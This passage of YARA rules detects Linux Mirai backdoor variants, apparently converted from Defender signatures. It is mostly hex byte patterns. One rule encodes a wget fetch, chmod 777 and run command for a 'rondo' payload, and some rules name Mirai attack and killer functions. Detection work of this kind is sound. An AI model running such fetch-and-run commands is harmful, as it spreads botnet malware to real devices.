        $x_1_1 = {10 00 00 05 24 c6 ff ff 90 a2 00 00 24 a5 00 01 a0 82 00 00 24 84 00 01 24 02 ff ff 14 c2 ff fa 24 c6 ff ff 03 e0 00 08 00 00 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {00 00 00 00 13 23 00 08 24 50 ff fc 03 20 f8 09 26 10 ff fc 8e 19 00 00 24 02 ff ff 8f bc 00 10 17 22 ff fa 00 00 00 00 8f bf 00 1c 8f b0 00 18 03 e0 00 08 27 bd 00 20}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JB_2147914110_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JB!MTB"
        threat_id = "2147914110"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {82 07 bf f8 87 31 20 05 84 10 20 01 87 28 e0 02 85 28 80 04 86 00 c0 01 c2 00 ff 5c 82 10 40 02 c2 20 ff 5c 23 00 00 c8}  //weight: 1, accuracy: High
        $x_1_2 = {c2 4a 3f ff 80 a0 60 0d 02 [0-3] ?? 02 3f ff 80 a0 60 0a 22 [0-3] c0 2a 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JM_2147914113_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JM!MTB"
        threat_id = "2147914113"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 13 41 83 ed 05 89 51 10 0f b6 43 04 48 83 c3 05 66 c7 01 02 00 89 51 04 88 41 14 48 83 c1 18 48 39 f3}  //weight: 1, accuracy: High
        $x_1_2 = {4c 63 db 31 d2 45 31 d2 49 f7 f3 bd ff ff ff ff 41 89 d4 48 89 c6 31 d2}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JN_2147914893_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JN!MTB"
        threat_id = "2147914893"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2a 01 00 eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 04 d0 8d e2 10 40 bd e8 0c d0 8d e2 0e f0 a0 e1 01 20 a0 e1 00 10 9f e5 e5 ff ff ea}  //weight: 1, accuracy: High
        $x_1_2 = {10 40 2d e9 08 40 9d e5 ac 00 ?? ef 01 0a 70 e3 00 40 a0 e1 03 ?? ?? ?? 17 01 00 eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 10 80 bd e8}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_ET_2147915799_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.ET!MTB"
        threat_id = "2147915799"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {88 1d 00 04 81 3d 00 00 3b bd 00 05 98 0b 00 14 91 2b 00 04 91 2b 00 10 b1 4b 00 00 39 6b 00 18 42 ?? ?? ?? 1d 3a ff fb 7d 3e 4a 14 3b 89 ff fa}  //weight: 1, accuracy: Low
        $x_1_2 = {34 1c ff ff 7c 09 03 a6 41 ?? ?? ?? 88 1d 00 01 39 3d 00 01 98 03 00 04 42 ?? ?? ?? 7d 69 02 a6 8b e9 00 01 38 89 00 01 3b ab ff ff 7f 9d f8 00 41 9c 00 a8}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JE_2147915800_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JE!MTB"
        threat_id = "2147915800"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {30 40 2d e9 0c 40 8d e2 30 00 94 e8 24 01 ?? ef 01 0a 70 e3 00 40 a0 e1 03 ?? ?? ?? f9 f9 ff eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3}  //weight: 1, accuracy: Low
        $x_1_2 = {00 20 64 22 02 40 03 20 c8 00 9f e5 0f e0 a0 e1 05 f0 a0 e1 04 00 a0 e1 06 05 00 eb 01 00 70 e3 00 50 a0 01 04 ?? ?? ?? 03 30 80 e2 03 50 c3 e3 05 00 50 e1 05 00 60 10 fe 04 00 1b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JO_2147915944_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JO!MTB"
        threat_id = "2147915944"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0d c0 a0 e1 00 d8 2d e9 04 b0 4c e2 14 d0 4d e2 1c 00 0b e5 00 30 a0 e3 18 30 0b e5 1c 30 1b e5 ff 30 03 e2 03 00 a0 e1}  //weight: 1, accuracy: High
        $x_1_2 = {00 30 d0 e5 00 30 53 e2 01 30 a0 13 04 00 58 e3 00 30 a0 c3 00 00 53 e3 db ?? ?? ?? 80 60 9d e5 68 11 9f e5 06 00 a0 e1 5e ?? ?? ?? 00 00 50 e3 01 50 a0 03}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JP_2147917133_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JP!MTB"
        threat_id = "2147917133"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {81 7f 00 10 80 1f 00 18 81 3f 00 3c 7f 8b 00 40 39 29 00 01 91 3f 00 3c 40 ?? ?? ?? 8b cb 00 00 38 0b 00 01 ?? 1f 00 10}  //weight: 1, accuracy: Low
        $x_1_2 = {39 24 ff fe 55 29 f8 7e 39 29 00 01 7d 29 03 a6 39 20 00 00 a0 03 00 00 38 84 ff fe 38 63 00 02 7d 29 02 14 42 ?? ?? ?? 2f 84 00 01}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JR_2147917136_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JR!MTB"
        threat_id = "2147917136"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {82 1b 00 01 84 00 40 0a 82 38 40 02 80 88 40 0b 02 ?? ?? ?? [0-32] 04 c2 0a 3f fc 84 0a 60 ff 86 02 3f fd 80 a0 40 02 9a 02 3f fe 12 ?? ?? ?? 82 02 3f fc}  //weight: 1, accuracy: Low
        $x_1_2 = {c2 4a 00 00 c2 0a 00 00 82 00 40 01 c4 50 c0 01 c2 0a 40 00 82 00 40 01 c2 50 c0 01 84 a0 80 01 12 ?? ?? ?? 01 00 00 00 c2 4a 00 00 80 a0 60 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JS_2147917787_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JS!MTB"
        threat_id = "2147917787"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {10 40 2d e9 25 00 ?? ef 01 0a 70 e3 00 40 a0 e1 03 ?? ?? ?? e0 00 00 eb 00 30 64 e2 00 30 80 e5 00 40 e0 e3 04 00 a0 e1 10 80 bd e8}  //weight: 1, accuracy: Low
        $x_1_2 = {80 30 80 e2 06 0d 53 e3 80 10 a0 e1 0e f0 a0 21 18 30 9f e5 00 30 93 e5 03 20 81 e0 03 10 d1 e7 01 30 d2 e5 03 3c a0 e1 43 08 81 e1 0e f0 a0 e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JT_2147919056_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JT!MTB"
        threat_id = "2147919056"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 20 a0 e1 c2 3f a0 e1 23 1c a0 e1 01 30 82 e0 ff 30 03 e2 03 30 61 e0 ff 10 03 e2 38 20 1b e5 5c 31 1b e5 94 03 03 e0 02 30 83 e0 05 20 83 e0 01 30 a0 e1 00 30 c2 e5 30 30 1b e5 01 30 83 e2 30 30 0b e5}  //weight: 1, accuracy: High
        $x_1_2 = {00 10 a0 e1 50 31 1b e5 0c 20 93 e5 50 31 1b e5 08 30 93 e5 02 30 63 e0 01 30 83 e2 01 00 a0 e1 03 10 a0 e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_HV_2147919516_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.HV!MTB"
        threat_id = "2147919516"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 ba 08 00 00 00 48 89 ca 48 63 ff b8 0e 00 00 00 0f 05 48 3d 00 f0 ff ff 48 89 c3 ?? ?? e8 5d 02 00 00 89 da 48 83 cb ff f7 da 89 10}  //weight: 1, accuracy: Low
        $x_1_2 = {53 b8 c9 00 00 00 0f 05 48 3d 00 f0 ff ff 48 89 c3 76 ?? e8 34 02 00 00 89 da 48 83 cb ff f7 da 89 10}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_ID_2147919517_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.ID!MTB"
        threat_id = "2147919517"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 56 8b 4c 24 10 8b 54 24 14 8b 74 24 18 8b 7c 24 1c 8b 44 24 0c 53 89 c3 b8 ac 00 00 00 cd 80 5b 89 c2 81 fa 00 f0 ff ff 76 ?? b8 f8 ff ff ff f7 da 65 89 10 83 c8 ff}  //weight: 1, accuracy: Low
        $x_1_2 = {b8 42 00 00 00 cd 80 89 c2 81 fa 00 f0 ff ff 76 ?? b8 f8 ff ff ff f7 da 65 89 10 83 c8 ff}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IL_2147919518_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IL!MTB"
        threat_id = "2147919518"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3c 60 18 82 00 bf d0 82 08 60 ff 80 a0 60 09 08 ?? ?? ?? a2 04 3f d0 82 00 bf bf 82 08 60 ff 80 a0 60 19 08 ?? ?? ?? 82 10 20 37 82 00 bf 9f 82 08 60 ff 80 a0 60 19 18 ?? ?? ?? 80 a0 e0 00 82 10 20 57}  //weight: 1, accuracy: Low
        $x_1_2 = {82 06 7f f4 f6 27 a0 50 80 a0 60 02 f8 27 a0 54 82 07 a0 50 fa 27 a0 58 f4 27 a0 4c ?? 10 00 18 92 10 00 19 94 10 00 1a 18 ?? ?? ?? c2 27 bf f4 40 00 00 15 01 00 00 00 81 c7 e0 08 91 e8 00 08}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_IZ_2147919519_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.IZ!MTB"
        threat_id = "2147919519"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 40 2d e9 18 40 80 e2 10 d0 4d e2 ac 10 9f e5 04 20 a0 e1 a8 30 9f e5 00 50 a0 e1 0d 00 a0 e1 0f e0 a0 e1 03 f0 a0 e1 04 00 a0 e1 94 30 9f e5 0f e0 a0 e1 03 f0 a0 e1 00 60 a0 e3}  //weight: 1, accuracy: High
        $x_1_2 = {22 3c 8d e2 02 00 81 e2 24 30 83 e2 00 20 83 e0 21 32 52 e5 00 00 53 e3 20 00 53 13 00 50 a0 01 07 ?? ?? ?? 01 20 86 e0 00 50 a0 e1}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JD_2147919520_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JD!MTB"
        threat_id = "2147919520"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {01 86 01 68 01 a6 cf 70 20 01 11 00 8a 20 03 17 00 d9 00 da 00 db 56 20 44 23 6f 22 3f 00 8c 20 30 80 c8 f7 fc 1c c8 b7 0a 0a 40 01 04 14 1f 34}  //weight: 1, accuracy: High
        $x_1_2 = {21 8d 01 6d a5 e1 c0 25 a1 10 ?? ?? 8c 1c 00 30 00 d8 40 c0 52 0d 20 00 55 24 c0 38 62 0c 20 00 55 24 c0 38 a4 14 00 30 4b ?? ?? ?? b2 14 81 30 55 24 c2 3d 16 26 40 70 ff ff f8 ff 18 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JL_2147919522_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JL!MTB"
        threat_id = "2147919522"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 54 28 21 00 53 20 21 02 15 10 2a 02 40 30 21 24 07 40 00 10 ?? ?? ?? 26 10 00 01 8c 84 00 00 8c a5 00 00 02 20 c8 21 03 20 f8 09 00 00 00 00 8f bc 00 10 10 ?? ?? ?? 00 10 10 80}  //weight: 1, accuracy: Low
        $x_1_2 = {30 c3 00 ff 24 62 ff d0 30 42 00 ff 2c 42 00 0a 14 ?? ?? ?? 24 62 ff bf 30 42 00 ff 2c 42 00 1a 10 ?? ?? ?? 24 62 ff 9f 24 02 00 37 10 ?? ?? ?? 00 c2 18 23}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JQ_2147919523_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JQ!MTB"
        threat_id = "2147919523"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0e 30 4b e5 0d 30 4b e5 0e 20 4b e2 14 30 1b e5 00 30 d3 e5 00 30 c2 e5 0e 30 4b e2 00 20 d3 e5 01 30 d3 e5 03 34 82 e1 1c 10 1b e5 03 10 81 e0 1c 10 0b e5}  //weight: 1, accuracy: High
        $x_1_2 = {ff 30 03 e2 03 30 61 e0 ff 10 03 e2 3c 20 1b e5 70 31 1b e5 94 03 03 e0 02 30 83 e0 05 20 83 e0 01 30 a0 e1 00 30 c2 e5 34 30 1b e5 01 30 83 e2 34 30 0b e5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JU_2147922951_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JU!MTB"
        threat_id = "2147922951"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "rm -f rondo.mipsel" ascii //weight: 1
        $x_1_2 = {77 67 65 74 20 68 74 74 70 3a 2f 2f [0-18] 2e 64 64 6e 73 2e 6e 65 74 2f 72 6f 6e 64 6f 2e [0-7] 3b 63 68 6d 6f 64 20 37 37 37 20 72 6f 6e 64 6f 2e [0-7] 3b 2e 2f 72 6f 6e 64 6f 2e [0-7] 20 73 65 6c 66 72 65 70 2e 6c 62 6c 69 6e 6b 2e 6d 69 70 73 65 6c}  //weight: 1, accuracy: Low
        $x_1_3 = "./rondo.pid" ascii //weight: 1
        $x_1_4 = "openvpncrypttcp" ascii //weight: 1
        $x_1_5 = "openvpncrypt" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JV_2147923934_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JV!MTB"
        threat_id = "2147923934"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AttackUdpRaknet" ascii //weight: 1
        $x_1_2 = "attack_parse.c" ascii //weight: 1
        $x_1_3 = "NetworkSendEncryptedPacket" ascii //weight: 1
        $x_1_4 = "port_killer.c" ascii //weight: 1
        $x_1_5 = "AttackTcpRawBasic" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JW_2147923945_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JW!MTB"
        threat_id = "2147923945"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {c2 14 80 00 82 15 00 01 82 18 61 40 80 88 63 40 12 ?? ?? ?? ?? 10 00 13 7f ff ff 01 ?? 10 00 12 80 a2 20 00 22 ?? ?? ?? c2 14 80 00 10 ?? ?? ?? a2 10 3f ff}  //weight: 1, accuracy: Low
        $x_1_2 = {23 00 01 00 84 04 a0 01 82 14 60 03 82 0c 00 01 82 00 60 01 84 08 40 02 80 a0 80 01 12 ?? ?? ?? f6 26 20 04 82 2c 00 12 80 88 60 08 02 ?? ?? ?? 82 0c 80 11 ?? 10 00 1b 92 10 20 04}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KC_2147924866_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KC!MTB"
        threat_id = "2147924866"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {00 00 85 8c 74 01 b9 8f 21 20 40 02 09 f8 20 03 24 00 a6 27 21 88 40 00 ff ff 02 24 18 00 bc 8f cd ?? ?? ?? 21 10 51 02 21 80 40 02 0b 00 13 24}  //weight: 1, accuracy: Low
        $x_1_2 = {64 01 b9 8f 21 28 80 00 09 f8 20 03 24 00 a7 27 21 88 40 00 ff ff 02 24 18 00 bc 8f 6b 00 22 16 21 80 00 00 d8 ?? ?? ?? ff ff 17 24}  //weight: 1, accuracy: Low
        $n_5_3 = {80 00 c3 8f 00 00 35 8e 44 00 d9 8f 18 00 75 00 00 00 e2 8e 64 00 34 8f 48 00 c5 8f 4c 00 d9 8f 12 80 00 00 21 80 70 02 00 19 10 00 80 80 10 00 21 80 03 02 09 f8 20 03 21 80 02 02 21 18 40 00 10 00 dc 8f 00 00 02 ae 34 00 c2 8f 00 00 00 00 0c 00 40 10 c0 10 15 00 08 00 89 26 21 48 22 01 00 00 26 8d 04 00 27 8d 21 10 c3 00 21 28 00 00 2b 40 46 00 21 18 e5 00 21 18 03 01 00 00 22 ad 04 00 23 ad}  //weight: -5, accuracy: High
    condition:
        (filesize < 20MB) and
        (not (any of ($n*))) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KB_2147925437_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KB!MTB"
        threat_id = "2147925437"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {7f ab fa 14 3b 9d 00 01 7f 9c c0 40 40 ?? ?? ?? 7c 9a f2 14 7c 79 5a 14 7f e5 fb 78 4b ff 9b 79 7c 9e fa 14 41 ?? ?? ?? 7f 7b fa 14 7c 1a 20 ae 2f 80 00 00 41 ?? ?? ?? 38 00 00 2e 7c 19 e9 ae 7f 8b e3 78}  //weight: 1, accuracy: Low
        $x_1_2 = {2f 80 00 00 7d 3c d8 50 39 7c 00 01 39 29 ff ff 7f e4 fb 78 7c 7d 5a 14 7c 05 03 78 7f 00 48 40 3b fe 00 01 41 ?? ?? ?? 40 ?? ?? ?? 7c 1d e1 ae 7f 8b 02 14 4b ff 9c 5d 2f 9e 00 00 41 ?? ?? ?? 2f 9f 00 00 38 80 00 2e 7f e3 fb 78}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_JX_2147925722_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.JX!MTB"
        threat_id = "2147925722"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attacks_stomp" ascii //weight: 1
        $x_1_2 = "killer_vanish_list" ascii //weight: 1
        $x_1_3 = "attacks_icmp" ascii //weight: 1
        $x_1_4 = "tcp_kill_port" ascii //weight: 1
        $x_1_5 = "killer_shoot_list" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KE_2147926127_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KE!MTB"
        threat_id = "2147926127"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {c0 2f a0 e1 00 10 81 e0 c1 27 62 e0 04 30 97 e5 02 00 80 e0 00 08 a0 e1 14 30 83 e2 20 c4 a0 e1 03 18 a0 e1 ff cc 0c e2 20 cc 8c e1 21 24 a0 e1 b2 c0 c5 e1 ff 2c 02 e2 00 c0 a0 e3 21 2c 82 e1 b0 c1 c5 e1 05 10 a0 e1 06 00 a0 e1}  //weight: 1, accuracy: High
        $x_1_2 = {0f 00 00 e2 57 0e 80 e2 08 00 80 e2 00 08 a0 e1 20 34 a0 e1 ff 3c 03 e2 20 3c 83 e1 04 20 a0 e3 ba 32 c8 e1 2c 20 c8 e5 08 30 a0 e3 0a 20 a0 e3 2e 30 c8 e5 2f 20 c8 e5 2d 50 c8 e5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KM_2147926257_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KM!MTB"
        threat_id = "2147926257"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {44 00 00 02 7c 00 00 26 74 09 10 00 7c 7f 1b 78 41 a2 00 10 48 00 05 a9 93 e3 00 00 3b e0 ff ff}  //weight: 1, accuracy: High
        $x_1_2 = {80 1f 00 00 7f 84 00 00 40 bc 00 14 80 7f 00 04 4b ff ff c1 90 7f 00 04 48 00 00 14}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KM_2147926257_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KM!MTB"
        threat_id = "2147926257"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {61 6a 6d 18 02 43 52 52 4e 47 56 02 4c 4d 56 02 44 4d 57 4c 46 22 00 40 43 4a 22 00 47 4c 43 40 4e 47 22 00 51 5b 51 56 47 4f 22 00 51 4a 22 00 0d 40 4b 4c 0d 40 57 51 5b 40 4d 5a 02 6f 6b 70 63 6b 22 00 6f 6b 70 63 6b 18 02 43 52 52 4e 47 56 02 4c 4d 56 02 44 4d 57 4c 46 22 00 0d 40 4b 4c 0d 40 57 51 5b 40 4d 5a 02 52 51 22 00 0d 40 4b 4c 0d 40 57 51 5b 40 4d 5a 02 49 4b 4e 4e 02 0f 1b 02 22 00 4e 4b 4c 57 5a}  //weight: 1, accuracy: High
        $x_1_2 = {4b 4c 46 4d 55 51 02 6c 76 02 14 0c 13 19 02 75 6d 75 14 16 0b 02 63 52 52 4e 47 75 47 40 69 4b 56 0d 17 11 15 0c 11 14 02 0a 69 6a 76 6f 6e 0e 02 4e 4b 49 47 02 65 47 41 49 4d 0b 02 61 4a 50 4d 4f 47 0d 17 13 0c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_KG_2147926540_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.KG!MTB"
        threat_id = "2147926540"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {93 61 16 62 05 79 10 61 70 39 22 23 04 73 10 23 ec 73 02 e1 11 23 04 73 22 23 fb 7c f0 ?? 24 73}  //weight: 1, accuracy: Low
